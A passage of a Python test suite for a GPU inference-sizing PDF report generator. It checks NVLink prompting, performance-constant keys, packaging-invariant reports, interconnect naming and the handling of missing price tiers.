        f'the raw (non-preset) branch honoured nvlink:true on {NO_NVLINK_GPU}: {cfg["nvlink"]!r}')

test("from_json raw branch: nvlink:true on a card without NVLink is refused too",
     check_raw_json_cannot_assert_nvlink)


def run_interactive_on(gpu_key, n_gpu, nvlink_answer=None):
    """interactive_mode() against one card, with the NVLink prompt supplied only
    when the card is expected to be asked about it. If that expectation is
    wrong the mocked input runs out of answers (or consumes the wrong one) and
    the test fails — which is the point: the prompt should not appear for a
    board that cannot do it."""
    answers = [
        str(list(gr.PRESETS.keys()).index("llama31-8b") + 1),
        str(list(gr.GPUS.keys()).index(gpu_key) + 1),
        str(n_gpu),
    ]
    if nvlink_answer is not None:
        answers.append(nvlink_answer)
    answers += ["3", "n", str(REQ["ctx"]), str(REQ["conc"])]
    with unittest.mock.patch("builtins.input", side_effect=answers), \
         contextlib.redirect_stdout(io.StringIO()):
        return gr.interactive_mode()


def check_interactive_skips_the_prompt():
    cfg = run_interactive_on(NO_NVLINK_GPU, 2)
    assert cfg["nvlink"] is False, f'{NO_NVLINK_GPU} came back with nvlink={cfg["nvlink"]!r}'

test("interactive_mode does not ask about NVLink on a card that has none",
     check_interactive_skips_the_prompt)


def check_interactive_still_asks_where_it_matters():
    cfg = run_interactive_on(NVLINK_GPU, 2, nvlink_answer="y")
    assert cfg["nvlink"] is True, f'{NVLINK_GPU} came back with nvlink={cfg["nvlink"]!r}'
    cfg = run_interactive_on(NVLINK_GPU, 2, nvlink_answer="n")
    assert cfg["nvlink"] is False, "answering n must still mean PCIe"

test("interactive_mode still asks — and honours the answer — on a card that has NVLink",
     check_interactive_still_asks_where_it_matters)


# ---- the key the PERF lookup reads ------------------------------------------
# compute() looked up PERF[cfg["vendor"]] for as long as the constants were
# hoisted, and no builder set the key, so every report silently took the nvidia
# fallback. It looks PERF up by cfg["perfKey"] now, because constants are
# measured per architecture and one vendor spans several. A builder that drops
# perfKey computes a card with no constants: every NVIDIA report on that path
# would say throughput is not modelled. vendor is still set, and still pinned,
# because it is the card's — it just selects nothing.
print("\nEvery builder sets the perfKey its constants are chosen by")


def builder_cfgs(gpu_key):
    """cfg from each of the four builder paths, for one card."""
    out = {"from_cli_args": gr.from_cli_args(
        dict_args(cli_args_for("llama31-8b"), gpu=gpu_key))}
    path = write_json({"preset": "llama31-8b", "gpu": gpu_key})
    try:
        out["from_json"] = gr.from_json(path)
    finally:
        os.remove(path)
    path = write_json({"params": 8, "layers": 32, "kv_heads": 8, "gpu": gpu_key})
    try:
        out["from_json raw branch"] = gr.from_json(path)
    finally:
        os.remove(path)
    out["interactive_mode"] = run_interactive_on(gpu_key, 1)
    return out


def dict_args(ns, **over):
    """A copy of a SimpleNamespace with some attributes replaced."""
    return types.SimpleNamespace(**dict(vars(ns), **over))


def check_every_builder_sets_perf_key():
    # Every catalog row, not one: the key is per row, and a builder that read it
    # from somewhere other than the selected card would agree with the right
    # answer on whichever row it happened to copy. Plus a probe row whose vendor
    # and perfKey differ, because on every real row both are "nvidia", and a
    # builder that filled perfKey from vendor passed on all twelve.
    probe = "__perf_key_probe"
    gr.GPUS[probe] = dict(gr.GPUS["h100-80"], name="Probe 80 GB",
                          vendor="acme", perfKey="acme-arch1")
    try:
        for gpu_key, gpu in gr.GPUS.items():
            for builder, cfg in builder_cfgs(gpu_key).items():
                assert "perfKey" in cfg, f"{builder} on {gpu_key}: cfg carries no perfKey"
                assert cfg["perfKey"] == gpu["perfKey"], (
                    f"{builder} on {gpu_key}: perfKey={cfg['perfKey']!r}, "
                    f"the card's is {gpu['perfKey']!r}")
                assert cfg["vendor"] == gpu["vendor"], (
                    f"{builder} on {gpu_key}: vendor={cfg['vendor']!r}, "
                    f"the card's is {gpu['vendor']!r}")
    finally:
        del gr.GPUS[probe]

test("from_cli_args / from_json / raw JSON / interactive_mode all set cfg['perfKey'] to the card's",
     check_every_builder_sets_perf_key)


def check_perf_key_tracks_the_card_not_the_json():
    # Both from_json branches copy keys they do not recognise straight into
    # cfg, so a JSON naming a perfKey would, unless overwritten, choose which
    # constants a card runs on — another architecture's, or constants for a
    # card that has none.
    for spec in ({"preset": "llama31-8b", "gpu": REQ["gpu"], "perfKey": "no-such-key"},
                 {"params": 8, "layers": 32, "kv_heads": 8, "gpu": REQ["gpu"],
                  "perfKey": "no-such-key"}):
        path = write_json(spec)
        try:
            cfg = gr.from_json(path)
        finally:
            os.remove(path)
        branch = "preset" if "preset" in spec else "raw"
        assert cfg["perfKey"] == gr.GPUS[REQ["gpu"]]["perfKey"], (
            f"{branch} branch: a JSON-supplied perfKey overrode the card's own: {cfg['perfKey']!r}")

test("a perfKey in the JSON cannot override the selected card's own, in either from_json branch",
     check_perf_key_tracks_the_card_not_the_json)

def check_every_builder_sets_vendor():
    want = gr.GPUS[REQ["gpu"]]["vendor"]
    cli_cfg = gr.from_cli_args(cli_args_for("llama31-8b"))
    assert cli_cfg.get("vendor") == want, f"from_cli_args: {cli_cfg.get('vendor')!r}"

    path = write_json({"preset": "llama31-8b", "gpu": REQ["gpu"]})
    try:
        json_cfg = gr.from_json(path)
    finally:
        os.remove(path)
    assert json_cfg.get("vendor") == want, f"from_json: {json_cfg.get('vendor')!r}"

    path = write_json({"params": 8, "layers": 32, "kv_heads": 8, "gpu": REQ["gpu"]})
    try:
        raw_cfg = gr.from_json(path)
    finally:
        os.remove(path)
    assert raw_cfg.get("vendor") == want, f"from_json raw branch: {raw_cfg.get('vendor')!r}"

    interactive_cfg = run_interactive_on(REQ["gpu"], 1)
    assert interactive_cfg.get("vendor") == want, f"interactive_mode: {interactive_cfg.get('vendor')!r}"

test("from_cli_args / from_json / raw JSON / interactive_mode all set cfg['vendor']",
     check_every_builder_sets_vendor)


def check_vendor_tracks_the_card_not_the_json():
    path = write_json({"preset": "llama31-8b", "gpu": REQ["gpu"], "vendor": "amd"})
    try:
        cfg = gr.from_json(path)
    finally:
        os.remove(path)
    assert cfg["vendor"] == gr.GPUS[REQ["gpu"]]["vendor"], (
        "a JSON-supplied vendor overrode the card's own — the report would name "
        f"a vendor the hardware is not: {cfg['vendor']!r}")

test("a vendor in the JSON cannot override the selected card's own",
     check_vendor_tracks_the_card_not_the_json)


def check_perf_lookup_actually_resolves():
    cfg = gr.from_cli_args(cli_args_for("llama31-8b"))
    assert cfg["perfKey"] in gr.PERF, (
        f"cfg['perfKey']={cfg['perfKey']!r} is not a key in PERF, so compute() "
        "has no constants for a card that has them")
    comp = gr.compute(cfg)
    assert comp["perf_mbu"] == gr.PERF[cfg["perfKey"]]["mbu"], (
        "compute() did not use the constants belonging to cfg['perfKey']")

test("the perfKey a builder sets is a real PERF key, and compute() uses its constants",
     check_perf_lookup_actually_resolves)


# ---- the default card is the catalog's, not a slug written in four places ---
def check_default_gpu_key_comes_from_the_catalog():
    flagged = [k for k, g in gr.GPUS.items() if g.get("default")]
    assert flagged == [gr.DEFAULT_GPU_KEY], (
        f"the catalog flags {flagged} as default but DEFAULT_GPU_KEY is {gr.DEFAULT_GPU_KEY!r}")
    path = write_json({"preset": "llama31-8b"})
    try:
        cfg = gr.from_json(path)
    finally:
        os.remove(path)
    assert cfg["gpu"] is gr.GPUS[gr.DEFAULT_GPU_KEY], (
        f'a config naming no GPU resolved to {cfg["gpu"]["name"]!r}')

test("a config that names no GPU gets the one the catalog marks default",
     check_default_gpu_key_comes_from_the_catalog)


# ---- the PDF says the same thing however the silicon is packaged -----------
# Every prose string in generate() is board-scoped or device-scoped, and an
# independent review reverted six of them one at a time without the suite
# noticing: the fit verdict, the over-by figure, the parallelism label, the
# notes gate, the interactive NVLink gate and the exported device view. The
# same guard the JS suite uses closes all of them at once — one dual-GCD board
# and two single-GCD boards are the same hardware, so the document must read
# the same, apart from what is genuinely counted in boards.
print("\nThe report reads the same however the silicon is packaged")

# perfKey is explicit: this card exists to test packaging, and without a key it
# would be a card with no throughput constants — every report built on it would
# still read the same both ways, and so still pass, about something else.
DUAL = {"gb": 128, "bw": 3276.8, "hyper": 6.0, "spec": 2.5, "spot": 1.2, "tflops": 383,
        "name": "X", "vendor": "nvidia", "perfKey": "nvidia", "devices": 2, "form": "sxm",
        "caps": {"fp8": True}}
SINGLE = dict(DUAL, gb=64, bw=DUAL["bw"] / 2, tflops=DUAL["tflops"] / 2,
              hyper=DUAL["hyper"] / 2, spec=DUAL["spec"] / 2, spot=DUAL["spot"] / 2, devices=1)


def report_text(card, boards, preset="llama31-70b", bpp=2, conc=16, **over):
    """Every string generate() puts in the document, in order."""
    cfg = dict(gr.arch_fields(gr.PRESETS[preset]), bpp=bpp, ctx=8192, conc=conc,
               n_gpu=boards, gpu=card, nvlink=True, kv_bpp=2, vendor=card["vendor"],
               perfKey=card["perfKey"], hf_model="m", model_name="M", **over)
    card_obj = gr.ReportCard(cfg, output_path=os.devnull)
    seen = []

    def harvest(item):
        """Every string this flowable will put on the page.

        Drawings matter as much as paragraphs: the VRAM bar is a Drawing whose
        String children carry the component sizes and the "N GiB free" label,
        and a Spy that only knew about Paragraph and Table never saw them — so
        the bar could be drawn against the wrong capacity, contradicting the
        verdict three lines above it, with this test green.
        """
        text = getattr(item, "text", None)
        if text:
            seen.append(text)
        for row in getattr(item, "_cellvalues", []):
            for cell in row:
                harvest(cell) if hasattr(cell, "text") or hasattr(cell, "contents") \
                    else seen.append(str(cell))
        for child in getattr(item, "contents", []):
            harvest(child)

    real_build = gr.SimpleDocTemplate.build
    try:
        # generate() builds `story` locally; capture it through the doc it hands to.
        captured = {}

        def fake_build(self, story, **kw):
            captured["story"] = story
        gr.SimpleDocTemplate.build = fake_build
        card_obj.generate()
        for item in captured.get("story", []):
            harvest(item)
    finally:
        gr.SimpleDocTemplate.build = real_build
    return seen


def check_packaging_is_invisible_to_the_report():
    import re
    # Three configurations, because the verdict has three branches and only the
    # "does not fit" one was being reached: a 70B at BF16 overflows a 64 GiB
    # device, the same model at INT4 fits, and an 8B is comfortable.
    cases = [("llama31-70b", 2, 16, 1),     # over a 64 GiB device: DOES NOT FIT
             ("llama31-70b", 0.5, 16, 1),   # comfortable
             ("llama31-70b", 1, 20, 1),     # 60.0 of 64.0: TIGHT
             # 5 dual-GCD modules is 10 devices: TP=2 x DP=5, the only shape
             # that renders the data-parallel note, and no case reached it.
             ("llama31-70b", 2, 16, 5)]
    # A price per board is legitimately different — one dual-GCD module costs
    # what two single-GCD ones do — so currency cells are compared as totals
    # below rather than cell by cell.
    def norm(xs, boards, devices):
        """Only what is genuinely counted in boards is excused, and only where it
        actually is that count — an earlier version skipped every bare integer
        cell in the document, which hid the max-users figures too."""
        board_cells = {str(boards), f"{boards} ({boards * devices} devices)"}
        out = []
        for t in xs:
            if "$" in t or t in board_cells or t.startswith("Total/hr ("):
                continue
            # The shortfall is checked as a relation just above, so the figure
            # itself is normalised here rather than left to differ.
            t = re.sub(r"(Need|requires) \d+\+ boards", r"\1 N+ boards", t)
            t = re.sub(r"Smallest fit: \d+ boards", "Smallest fit: N boards", t)
            out.append(re.sub(r"\b\d+x X", "Nx X", t))
        return out

    def boards_needed(xs):
        """The shortfall, counted in boards, so it differs between the two
        packagings by exactly the devices-per-board factor — a relation to
        check, not a value to normalise away."""
        for t in xs:
            m = re.search(r"Smallest fit: (\d+) boards", t) or \
                re.search(r"(?:Need|requires) (\d+)\+ boards", t)
            if m:
                return int(m.group(1))
        return None
    verdicts = set()

    # and the totals themselves must match, or the exclusion above would hide
    # exactly the double-count this change exists to prevent
    def hourly(card, boards):
        cfg = dict(gr.arch_fields(gr.PRESETS["llama31-70b"]), bpp=2, ctx=8192, conc=16,
                   n_gpu=boards, gpu=card, nvlink=True, kv_bpp=2, vendor=card["vendor"],
                   perfKey=card["perfKey"])
        c = gr.compute(cfg)
        return tuple(round(c[k], 6) for k in ("hourly_hyper", "hourly_spec", "hourly_spot"))
    assert hourly(DUAL, 1) == hourly(SINGLE, 2), (
        f"cost differs by packaging: {hourly(DUAL, 1)} vs {hourly(SINGLE, 2)}")
    for preset, bpp, conc, boards in cases:
        raw_a = report_text(DUAL, boards, preset, bpp, conc)
        raw_b = report_text(SINGLE, boards * 2, preset, bpp, conc)
        need_a, need_b = boards_needed(raw_a), boards_needed(raw_b)
        if need_b is not None:
            assert need_a == math.ceil(need_b / 2), (
                f"{preset} at {bpp}: the dual-GCD report needs {need_a} boards and the "
                f"single-GCD one {need_b} — two devices per board makes that "
                f"{math.ceil(need_b / 2)}")
        a, b = norm(raw_a, boards, 2), norm(raw_b, boards * 2, 1)
        assert a, "no text captured from the report — the spy is not seeing the story"
        verdicts.update(t.split("]")[0] for t in a if t.startswith("["))
        diffs = [f"{x!r} != {y!r}" for x, y in zip(a, b) if x != y]
        assert not diffs, (
            f"{preset} at {bpp} B/param, {conc} concurrent, differs between {boards} dual-GCD board(s) "
            f"and {boards * 2} single-GCD boards holding the same silicon:\n       " + "\n       ".join(diffs[:6]))
    assert len(verdicts) >= 3, (
        f"only reached the verdict branches {sorted(verdicts)} — the fits and tight "
        "branches carry their own capacity expression and go unchecked otherwise")

test("one dual-GCD board and two single-GCD boards produce the same report",
     check_packaging_is_invisible_to_the_report)


def check_compute_is_blind_to_packaging():
    """compute() itself, not the prose around it.

    The decode ceiling is the one arithmetic site no case exercised with more
    than one device per board: every other case is bandwidth-bound there, and
    the product device_tflops * device_count is unchanged by the sabotage —
    what moves is the interconnect penalty, 1.0 at one board against 0.85 at
    two devices. So it has to be compared where those two disagree.
    """
    bound = dict(params=30, active=10, layers=48, kv_heads=8, h_dim=128,
                 ctx=256, conc=256, bpp=2, kv_bpp=2, shared_exp=0, max_ctx=1048576)
    dual = gr.compute(dict(bound, n_gpu=1, gpu=DUAL, nvlink=True, vendor="nvidia",
                           perfKey=DUAL["perfKey"]))
    single = gr.compute(dict(bound, n_gpu=2, gpu=SINGLE, nvlink=True, vendor="nvidia",
                             perfKey=SINGLE["perfKey"]))
    # Python's compute() exports no compute-bound flag (the JS engine does), so
    # bindingness is established directly: ten times the bandwidth must not move
    # the saturated figure if the compute ceiling is what is holding it.
    faster = gr.compute(dict(bound, n_gpu=1, gpu=dict(DUAL, bw=DUAL["bw"] * 10),
                             nvlink=True, vendor="nvidia", perfKey=DUAL["perfKey"]))
    assert abs(faster["sat_tok"] - dual["sat_tok"]) < 1, (
        "the probe is bandwidth-bound, so it does not exercise the compute ceiling")
    skip = {"gpu"}
    diffs = [f"{k}: {dual[k]!r} != {single[k]!r}" for k in dual
             if k not in skip and dual[k] != single.get(k)]
    assert not diffs, ("compute() differs between one dual-GCD board and two single-GCD "
                       "boards holding the same silicon:\n       " + "\n       ".join(diffs[:6]))

test("compute() gives the same answer however the silicon is packaged",
     check_compute_is_blind_to_packaging)


def check_capacity_label_keeps_integers_integral():
    """Stated absolutely, because every other assertion about capacity reads the
    formatter's own output and would follow a regression in it: dropping the
    integer rule turns "80 GiB" into "80.0 GiB" on all twelve rows."""
    assert gr.capacity_label(80) == "80 GiB", gr.capacity_label(80)
    assert gr.capacity_label(16) == "16 GiB", gr.capacity_label(16)
    assert gr.capacity_label(141) == "141 GiB", gr.capacity_label(141)
    assert gr.capacity_label(128 / 3) == "42.7 GiB", gr.capacity_label(128 / 3)

test("an integer capacity renders without a decimal in the PDF too",
     check_capacity_label_keeps_integers_integral)


def check_interactive_gates_nvlink_on_devices():
    """interactive_mode() decides whether to ask about NVLink at all.

    Every card the existing harness can select is one device per board, so
    n_gpu and the device count are always equal there and the gate could be
    reverted to the board count with the suite green. This puts a dual-GCD
    board in the catalog for the length of the test.
    """
    key = "__dual_probe"
    gr.GPUS[key] = dict(DUAL, name="Dual probe")
    try:
        # One board, two devices: the prompt must be asked, and answering "n"
        # must be honoured — a board-scoped gate would skip it and force PCIe.
        cfg = run_interactive_on(key, 1, nvlink_answer="y")
        assert cfg["nvlink"] is True, (
            "interactive_mode did not ask about NVLink on a single board that is "
            f"two devices: {cfg['nvlink']!r}")
        assert run_interactive_on(key, 1, nvlink_answer="n")["nvlink"] is False
    finally:
        del gr.GPUS[key]

test("interactive_mode asks about NVLink when one board is several devices",
     check_interactive_gates_nvlink_on_devices)


# ---- the parallelism row and the command it sits above --------------------
# Two gates, written differently, that have to agree for every input: the GPU
# configuration row branches on `device_count_for(cfg) > 1` and the command on
# `tp * dp > 1`. Both engines carry the same pair — index.html's badge branches
# on `computed.deviceCount > 1` beside a command gated on `tp * dp > 1`, and
# model.test.js checks that side. Now that both read one split off compute()
# they agree for every valid configuration, but "cannot drift apart" is a
# property, and until something checks it, it is a claim: this document has
# contradicted itself across exactly this pair before, which is why the comment
# above the row names the case.
print("\nThe parallelism row and the command below it describe the same split")


def report_strings(card, boards, **over):
    """Every string in the story, plus the cfg that produced it.

    Not a second harvester because report_text() misses the command — it does
    not. The command renders as one Paragraph per line
    (generate_report.py:826-828), so .text reaches every line of it and the
    packaging-invariance test above has always compared it; reverting
    build_vllm_cmd() to split on boards turns that test red. What the callers
    here need, and report_text() does not return, is the cfg alongside the
    strings, so a rendered divisor can be checked against the one the figure
    was actually computed with. The .lines walk is a forward guard only:
    nothing in the report is a Preformatted today.
    """
    cfg = dict(gr.arch_fields(gr.PRESETS["llama31-70b"]), ctx=8192, conc=16,
               n_gpu=boards, gpu=card, nvlink=True, kv_bpp=2, vendor=card["vendor"],
               perfKey=card["perfKey"], hf_model="m", model_name="M", **over)
    return cfg, story_strings(cfg)


class DrawSpy:
    """A canvas that keeps everything a reader could end up seeing and ignores
    the rest.

    The header and the footer are not in the story: generate() hands them to
    doc.build as callbacks and reportlab calls them with a canvas, so a spy that
    walked the story alone never saw them. A figure printed in the footer of
    every page was invisible to every test below.

    The metadata setters are here for the same reason. setTitle() does not draw
    anything on the page, but it is what a PDF viewer puts in its title bar and
    what pdfinfo prints, so a figure passed to it is shown to the reader as
    surely as a table row."""

    def __init__(self, seen):
        self._seen = seen

    def drawString(self, x, y, text, *a, **kw):
        self._seen.append(str(text))

    drawRightString = drawCentredString = drawCenteredString = drawAlignedString = drawString

    def _metadata(self, value, *a, **kw):
        if isinstance(value, str):
            self._seen.append(value)

    setTitle = setSubject = setAuthor = setCreator = setKeywords = setProducer = _metadata

    def __getattr__(self, name):
        return lambda *a, **kw: None


class DocStub:
    """What a page callback reads off the document: the page number."""

    def __init__(self, page=1):
        self.page = page


def story_strings(cfg, comp=None):
    """Every string this cfg puts in front of a reader: the story, the header and
    footer drawn around it, and anything generate() prints while building it.

    Separate from report_strings() so a test can hand over a whole cfg — that one
    fixes the preset and the interconnect. `comp` substitutes the computed
    figures, which is how a caller renders the same card with its throughput
    figures moved.

    The walk is the one report_strings() describes, plus two places a string can
    hide from it: KeepTogether holds its flowables in `_content` rather than
    `contents`, and a Paragraph's bullet is `bulletText`, not part of `text`."""
    obj = gr.ReportCard(cfg, output_path=os.devnull)
    if comp is not None:
        obj.comp = comp
    seen = []

    def harvest(item):
        text = getattr(item, "text", None)
        if text:
            seen.append(text)
        bullet = getattr(item, "bulletText", None)
        if bullet:
            seen.append(str(bullet))
        for line in getattr(item, "lines", None) or []:
            seen.append(line if isinstance(line, str) else str(line))
        for row in getattr(item, "_cellvalues", []):
            for cell in row:
                harvest(cell) if hasattr(cell, "text") or hasattr(cell, "contents") \
                    else seen.append(str(cell))
        for child in getattr(item, "contents", []) or []:
            harvest(child)
        for child in getattr(item, "_content", []) or []:
            harvest(child)

    captured = {}

    class DocSpy:
        """Stands in for SimpleDocTemplate: keeps what the document was built
        with instead of writing a PDF. The constructor's arguments matter as much
        as the story — `title=` there becomes the PDF's metadata title, which a
        viewer shows in its title bar."""

        def __init__(self, *args, **kw):
            captured["doc_args"], captured["doc_kw"] = args, kw

        def build(self, story, **kw):
            captured["story"], captured["build_kw"] = story, kw

    real_doc = gr.SimpleDocTemplate
    printed, complained = io.StringIO(), io.StringIO()
    try:
        gr.SimpleDocTemplate = DocSpy
        with contextlib.redirect_stdout(printed), contextlib.redirect_stderr(complained):
            obj.generate()
        for item in captured.get("story", []):
            harvest(item)
    finally:
        gr.SimpleDocTemplate = real_doc
    # Every string the document was named with, whatever the keyword was called.
    seen.extend(v for v in list(captured.get("doc_args", ())) + list(captured.get("doc_kw", {}).values())
                if isinstance(v, str))
    # Every page callback doc.build was given, not just the first one: a report
    # whose second page carries a different footer is still the same document.
    spy = DrawSpy(seen)
    callbacks = {k: v for k, v in captured.get("build_kw", {}).items() if callable(v)}
    assert callbacks, "generate() passed no page callback, so the header and footer are unread"
    for name, fn in sorted(callbacks.items()):
        fn(spy, DocStub(page=1 if "First" in name else 2))
    # And anything it said while building, on either stream.
    for stream in (printed, complained):
        seen.extend(line for line in stream.getvalue().splitlines() if line.strip())
    return seen


def check_parallelism_row_agrees_with_the_command():
    single_dev, multi_dev, skipped = 0, 0, 0
    for card in (dict(DUAL, devices=1, gb=80, name="S"), DUAL):
        for boards in (1, 2, 3, 4, 5, 8, 9, 12, 16, 17, 24, 64, 100, 128):
            for bpp in (2, 0.5):
                cfg, seen = report_strings(card, boards, bpp=bpp)
                # A command that does not fit is not a command: both engines
                # short-circuit to a comment before any flag is reached, so the
                # property genuinely does not hold there and asserting it would
                # only pin the short-circuit.
                if not gr.compute(cfg)["fits"]:
                    skipped += 1
                    continue
                rows = [t for t in seen if t == "Single device" or t.startswith("Tensor parallel")]
                assert len(rows) == 1, (
                    f"{boards}x {card['name']}: expected one parallelism row, found {rows!r}")
                says_single = rows[0] == "Single device"
                asks_for_none = not any("parallel-size" in t for t in seen)
                assert says_single == asks_for_none, (
                    f"{boards}x {card['name']} ({gr.device_count_for(cfg)} devices) at {bpp} B/param: "
                    f"the row says {rows[0]!r} while the command "
                    f"{'asks for no parallelism' if asks_for_none else 'asks for it'}: "
                    + repr([t for t in seen if "parallel-size" in t]))
                if says_single:
                    single_dev += 1
                else:
                    multi_dev += 1
    # Or an iff that only ever saw one of its two sides would pass regardless.
    assert single_dev and multi_dev, (
        f"not discriminating: {single_dev} single-device and {multi_dev} multi-device "
        f"fitting configurations ({skipped} skipped)")

test("the parallelism row says single device exactly when the command asks for none",
     check_parallelism_row_agrees_with_the_command)


# ---- the interconnect, named on every form ---------------------------------
# Every value the catalog's `form` may take. The contract tests/model.test.js
# checks every row against; tests/parity.test.py carries the same four.
FORMS = ("sxm", "pcie", "consumer", "oam")


def check_every_pdf_surface_names_the_link_the_devices_use():
    """What the PDF prints, not what interconnect_name() returns: the title, the
    GPU configuration row and the notes each name the link, and on an OAM board
    none of them may say PCIe or NVLink under any wording — the downgrade note
    included. Every form, NVLink asked for and not, one domain and past it, with
    constants and without."""
    base = gr.GPUS["b200-192"]
    seen, checked = set(), 0
    for form in FORMS:
        for boards in (2, 16):
            for asked in (True, False):
                for perf_key in ("nvidia", "no-such-key"):
                    card = dict(base, form=form, perfKey=perf_key, name=f"probe {form} 192 GB")
                    with contextlib.redirect_stdout(io.StringIO()) as said:
                        nvlink = gr.nvlink_for(card, asked)
                    want = "NVLink" if nvlink else "Infinity Fabric" if form == "oam" else "PCIe"
                    cfg = dict(gr.arch_fields(gr.PRESETS["llama31-70b"]), bpp=2, ctx=8192, conc=16,
                               n_gpu=boards, gpu=card, nvlink=nvlink, kv_bpp=2, vendor=card["vendor"],
                               perfKey=perf_key, hf_model="m", model_name="M")
                    texts = story_strings(cfg)
                    label = (f"{form} x{boards}, NVLink {'asked for' if asked else 'not asked for'}, "
                             f"perfKey {perf_key}")
                    assert want in texts, f"{label}: no GPU configuration cell reads {want!r}"
                    assert any(f"({want})" in t for t in texts), f"{label}: the title does not name {want}"
                    # Notes are bulleted ("• …"), so the sentence is found, not anchored.
                    assert any(f"{want} interconnect assumed." in t for t in texts), (
                        f"{label}: the notes do not name {want}")
                    if form == "oam":
                        for other in ("PCIe", "NVLink"):
                            hit = [t for t in texts + [said.getvalue()] if other in t
                                   and not t.startswith("Note: ")]
                            assert not hit, f"{label}: an OAM board's PDF mentions {other}: {hit[0][:160]!r}"
                        if asked:
                            assert "using Infinity Fabric instead" in said.getvalue(), (
                                f"{label}: the downgrade note reads {said.getvalue()!r}")
                    else:
                        hit = [t for t in texts + [said.getvalue()] if "Infinity Fabric" in t]
                        assert not hit, f"{label}: a {form} board's PDF mentions Infinity Fabric: {hit[0][:160]!r}"
                    seen.add(want)
                    checked += 1
    assert seen == {"NVLink", "Infinity Fabric", "PCIe"}, f"the grid reached only {sorted(seen)}"
    assert checked == len(FORMS) * 2 * 2 * 2


test("every PDF surface names the link the devices actually talk over, on every form",
     check_every_pdf_surface_names_the_link_the_devices_use)


def check_interactive_names_an_oam_boards_fabric():
    """The interactive CLI skips the NVLink question on a board without it and
    says what it assumes instead — which, on an OAM board, is its fabric."""
    card = dict(gr.GPUS["b200-192"], form="oam", name="probe oam 192 GB")
    buf = io.StringIO()
    with unittest.mock.patch.dict(gr.GPUS, {"probe-oam": card}):
        answers = [str(list(gr.PRESETS).index("llama31-8b") + 1),
                   str(list(gr.GPUS).index("probe-oam") + 1), "2",
                   "3", "n", str(REQ["ctx"]), str(REQ["conc"])]
        with unittest.mock.patch("builtins.input", side_effect=answers), contextlib.redirect_stdout(buf):
            cfg = gr.interactive_mode()
    out = buf.getvalue()
    assert cfg["nvlink"] is False, f"an OAM board came out of the CLI with nvlink={cfg['nvlink']!r}"
    assert "probe oam 192 GB has no NVLink — its devices use Infinity Fabric." in out, out[-400:]
    assert "assuming PCIe" not in out, "the CLI told an OAM board's reader it would assume PCIe"


test("the interactive CLI names an OAM board's fabric when it skips the NVLink question",
     check_interactive_names_an_oam_boards_fabric)


# ---- a price tier with no confirmed price ---------------------------------
NO_PRICE = "no confirmed hourly price"
TIER_ROWS = (("hyper", "Hyperscaler", "hourly_hyper"), ("spec", "Specialized", "hourly_spec"),
             ("spot", "Spot / marketplace", "hourly_spot"))


def check_a_null_tier_stays_none_and_every_pdf_surface_says_so():
    """A tier the catalog records as null has no confirmed hourly price. compute()
    keeps it None, the cost table prints a dash in each figure's place, the
    Source line says why, and nothing in the report reads "None", "nan" or
    "$0.00" — nor a neighbouring tier's price in the empty row. Every non-empty
    set of null tiers, one board and three. The card carries h100-80's
    provenance, so a source attached to a null tier would show."""
    base = gr.GPUS["h100-80"]
    checked = 0
    for mask in range(1, 8):
        for boards in (1, 3):
            card = dict(base)
            nulls = [t for i, (t, _, _) in enumerate(TIER_ROWS) if mask & (1 << i)]
            for t in nulls:
                card[t] = None
            label = f"null {'+'.join(nulls)}, {boards} board{'s' if boards > 1 else ''}"
            cfg = dict(gr.arch_fields(gr.PRESETS["llama31-8b"]), bpp=2, ctx=8192, conc=16,
                       n_gpu=boards, gpu=card, nvlink=True, kv_bpp=2, vendor=card["vendor"],
                       perfKey=card["perfKey"], hf_model="m", model_name="M")
            c = gr.compute(cfg)
            texts = story_strings(cfg)
            for tier, row_label, field in TIER_ROWS:
                at = texts.index(row_label)
                cells = texts[at + 1:at + 4]
                if tier in nulls:
                    assert c[field] is None, f"{label}: compute() {field} is {c[field]!r}, not None"
                    assert cells == ["—", "—", "—"], f"{label}: the {row_label} row reads {cells}"
                else:
                    assert c[field] == card[tier] * boards, f"{label}: {field}"
                    assert cells[0] == f"${card[tier]:.2f}" and cells[1] == f"${card[tier] * boards:.2f}", (
                        f"{label}: the {row_label} row reads {cells}")
            source = next(t for t in texts if t.startswith("Source — "))
            for tier, row_label, _ in TIER_ROWS:
                name = {"hyper": "Hyperscaler", "spec": "Specialized", "spot": "Spot"}[tier]
                if tier in nulls:
                    assert f"{name}: {NO_PRICE}." in source, f"{label}: the Source line reads {source!r}"
            for bad in ("None", "nan", "$0.00", "$0 "):
                hit = [t for t in texts if bad in t]
                assert not hit, f"{label}: the report prints {bad!r}: {hit[0][:160]!r}"
            if "hyper" in nulls:
                assert not any(base["priceSource"]["hyper"]["sku"] in t for t in texts), (
                    f"{label}: a null hyper tier still names its source")
            checked += 1
    assert checked == 7 * 2


test("a price tier with no confirmed price stays None, and every PDF surface says so",
     check_a_null_tier_stays_none_and_every_pdf_surface_says_so)


def check_the_cli_menu_prints_only_the_prices_a_card_has():
    """The interactive GPU menu shows each card's spot-to-hyperscaler span. A card
    with a null tier shows the tiers it does price, cheapest tier first, and a
    card with none says so — never "$None". Cards priced on both ends keep the
    line they always had."""
    base = gr.GPUS["h100-80"]
    shapes = {"probe-none": (None, None, None), "probe-spec": (None, 3.8, None),
              "probe-no-hyper": (None, 2.39, 1.11), "probe-all": (6.0, 2.39, 1.11)}
    extra = {k: dict(base, hyper=h, spec=sp, spot=st, priceSource={}, name=f"{k} 80 GB")
             for k, (h, sp, st) in shapes.items()}
    buf = io.StringIO()
    with unittest.mock.patch.dict(gr.GPUS, extra):
        answers = [str(list(gr.PRESETS).index("llama31-8b") + 1), str(list(gr.GPUS).index("h100-80") + 1),
                   "1", "3", "n", str(REQ["ctx"]), str(REQ["conc"])]
        with unittest.mock.patch("builtins.input", side_effect=answers), contextlib.redirect_stdout(buf):
            gr.interactive_mode()
    menu = {line.split(".", 1)[1].split()[0]: line for line in buf.getvalue().splitlines()
            if re.match(r"^\s+\d+\. ", line)}
    want = {"probe-none": f"({base['bw']} GB/s, {NO_PRICE})", "probe-spec": f"({base['bw']} GB/s, $3.8/hr)",
            "probe-no-hyper": f"({base['bw']} GB/s, $1.11-$2.39/hr)", "probe-all": f"({base['bw']} GB/s, $1.11-$6.0/hr)"}
    for k, tail in want.items():
        assert menu[k].endswith(tail), f"{k}: the menu line reads {menu[k]!r}, expected it to end {tail!r}"
    assert not any("None" in line for line in menu.values()), "the menu printed None"


test("the CLI menu prints only the prices a card has", check_the_cli_menu_prints_only_the_prices_a_card_has)


# ---- the VRAM breakdown row adds up ---------------------------------------
# A reader adds a breakdown up. Before the weights divisor was corrected this
# row did add up, because nothing replicated; correcting it broke the relation
